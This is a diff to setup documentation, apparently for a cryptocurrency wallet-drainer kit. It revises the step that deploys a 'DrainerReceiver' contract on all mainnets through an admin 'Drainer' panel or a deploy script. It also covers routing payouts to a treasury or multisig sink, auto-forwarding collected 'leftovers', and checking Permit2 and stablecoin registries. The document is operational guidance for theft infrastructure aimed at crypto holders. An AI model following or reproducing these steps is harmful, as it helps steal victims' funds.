@@ -7,9 +7,13 @@ Setup
 3a. Set a **Payout sink** per family (treasury or multisig). Setting a key only defaults
    the payout when none exists, so rotating a hot key never silently moves the sink.
    Enable "Auto-forward leftovers" so anything landing on the collector is pushed on.
-4. Deploy the receiver: solc --optimize --combined-json bin,abi contracts/DrainerReceiver.sol
-   then python scripts/deploy_receiver.py        (writes drainer_receiver_evm, all mainnets)
-   Add --testnet for Sepolia / BaseSepolia / ArbitrumSepolia.
+4. Deploy the receiver. The compiled artifact (contracts/DrainerReceiver.json) is
+   committed, so no compiler is needed. From Admin → Drainer → Setup click
+   "Deploy missing receivers (all mainnets)", or deploy per chain in the same
+   section. Each deploy verifies owner + payout on-chain before it is recorded.
+   CLI equivalent: python scripts/deploy_receiver.py [--testnet].
+   To rebuild the artifact from source: click "Compile receiver artifact"
+   (needs py-solc-x) or run solc --optimize and rebuild the JSON.
 5. Check the registry before trusting it:
    python scripts/verify_networks.py --testnet
    It confirms RPC chain ids, Multicall3 + Permit2 deployment, and stablecoin symbols/decimals.
